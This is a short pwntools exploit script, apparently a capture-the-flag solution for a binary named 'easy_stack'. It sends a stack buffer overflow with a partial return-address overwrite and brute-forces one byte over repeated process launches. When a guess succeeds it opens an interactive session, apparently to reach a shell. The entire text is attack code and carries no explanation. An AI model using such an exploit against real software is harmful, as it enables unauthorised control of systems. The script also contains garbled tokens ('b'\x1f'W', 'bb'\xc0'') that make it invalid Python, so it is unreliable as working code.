from pwn import *
global p
global i
global libc_base
offset = 0x80
colide = [b'\x0f', b'\x1f'W, b'\x2f', b'\x3f', b'\x4f', b'\x5f', b'\x6f', b'\x7f', b'\x8f', b'\x9f', b'\xaf', b'\xbf', b'\xcf', b'\xdf', b'\xef', b'\xff', ]

def exp():
    p.send((offset + 8) * b'A' + bb'\xc0' + colide[i])
    p.interactive()

if __name__ == '__main__':
    i = 0
    while True:
        try:
            p = process('./easy_stack')
            exp()
        except Exception as e:
            i = i + 1
            continue